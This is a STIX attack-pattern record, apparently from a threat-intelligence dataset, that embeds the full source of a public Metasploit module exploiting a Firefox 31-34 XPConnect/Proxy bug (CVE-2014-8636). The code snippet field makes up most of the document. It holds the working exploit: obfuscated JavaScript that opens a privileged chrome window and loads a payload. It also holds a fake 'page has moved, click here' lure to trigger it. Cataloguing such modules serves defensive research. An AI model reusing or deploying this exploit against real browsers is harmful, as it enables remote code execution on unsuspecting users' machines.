{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ae1d7a7e-424f-44c6-8019-a9e8b64bcb1a",
    "created": "2024-08-14T17:05:46.880417Z",
    "modified": "2024-08-14T17:05:46.880424Z",
    "name": "Firefox Proxy Prototype Privileged Javascript Injection",
    "description": " This exploit gains remote code execution on Firefox 31-34 by abusing a bug in the XPConnect component and gaining a reference to the privileged chrome:// window. This exploit requires the user to click anywhere on the page to trigger the vulnerability.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/browser/firefox_proxy_prototype.rb",
            "external_id": "firefox_proxy_prototype.rb"
        },
        {
            "source_name": "reference",
            "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1120261"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2015/03/23/r7-2015-04-disclosure-mozilla-firefox-proxy-prototype-rce-cve-2014-8636"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/exploitation/jsobfu'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  include Msf::Exploit::Remote::BrowserExploitServer\n  include Msf::Exploit::Remote::FirefoxPrivilegeEscalation\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Firefox Proxy Prototype Privileged Javascript Injection',\n      'Description'    => %q{\n        This exploit gains remote code execution on Firefox 31-34 by abusing a bug in the XPConnect\n        component and gaining a reference to the privileged chrome:// window. This exploit\n        requires the user to click anywhere on the page to trigger the vulnerability.\n      },\n      'License' => MSF_LICENSE,\n      'Author'  => [\n        'joev' # discovery and metasploit module\n      ],\n      'DisclosureDate' => '2014-01-20',\n      'References' => [\n        ['CVE', '2014-8636'], # proxy injection\n        ['CVE', '2015-0802'], # can access messageManager property in chrome window\n        ['URL', 'https://bugzilla.mozilla.org/show_bug.cgi?id=1120261'],\n        ['URL', 'https://www.rapid7.com/blog/post/2015/03/23/r7-2015-04-disclosure-mozilla-firefox-proxy-prototype-rce-cve-2014-8636' ]\n\n      ],\n      'Targets' => [\n        [\n          'Universal (Javascript XPCOM Shell)', {\n            'Platform' => 'firefox',\n            'Arch' => ARCH_FIREFOX\n          }\n        ],\n        [\n          'Native Payload', {\n            'Platform' => %w{ java linux osx solaris win },\n            'Arch'     => ARCH_ALL\n          }\n        ]\n      ],\n      'DefaultTarget' => 0,\n      'BrowserRequirements' => {\n        :source  => 'script',\n        :ua_name => HttpClients::FF,\n        :ua_ver  => lambda { |ver| ver.to_i.between?(31, 34) }\n      }\n    ))\n\n    register_options([\n      OptString.new('CONTENT', [ false, \"Content to display inside the HTML <body>.\" ])\n    ])\n  end\n\n  def on_request_exploit(cli, request, target_info)\n    send_response_html(cli, generate_html(target_info))\n  end\n\n  def default_html\n    \"The page has moved. <span style='text-decoration:underline;'>Click here</span> to be redirected.\"\n  end\n\n  def generate_html(target_info)\n    key = Rex::Text.rand_text_alpha(5 + rand(12))\n    frame = Rex::Text.rand_text_alpha(5 + rand(12))\n    r = Rex::Text.rand_text_alpha(5 + rand(12))\n    opts = { key => run_payload } # defined in FirefoxPrivilegeEscalation mixin\n\n    js = js_obfuscate %Q|\n      var opts = #{JSON.unparse(opts)};\n      var key = opts['#{key}'];\n      var props = {};\n      props.has = function(n){\n        if (!window.top.x && n=='nodeType') {\n          window.top.x=window.open(\"chrome://browser/content/browser.xul\", \"x\",\n            \"chrome,,top=-9999px,left=-9999px,height=100px,width=100px\");\n          if (window.top.x) {\n            Object.setPrototypeOf(document, pro);\n            setTimeout(function(){\n              x.location='data:text/html,<iframe mozbrowser src=\"about:blank\"></iframe>';\n\n              setTimeout(function(){\n                x.messageManager.loadFrameScript('data:,'+key, false);\n                setTimeout(function(){\n                  x.close();\n                }, 100)\n              }, 100)\n            }, 100);\n          }\n        }\n      }\n      var pro = Object.getPrototypeOf(document);\n      Object.setPrototypeOf(document, Proxy.create(props));\n    |\n\n    %Q|\n      <!doctype html>\n      <html>\n        <body>\n          <script>\n            #{js}\n          </script>\n          #{datastore['CONTENT'] || default_html}\n        </body>\n      </html>\n    |\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-01-20",
    "x_mitre_platforms": [
        "%w{ java linux osx solaris win }"
    ]
}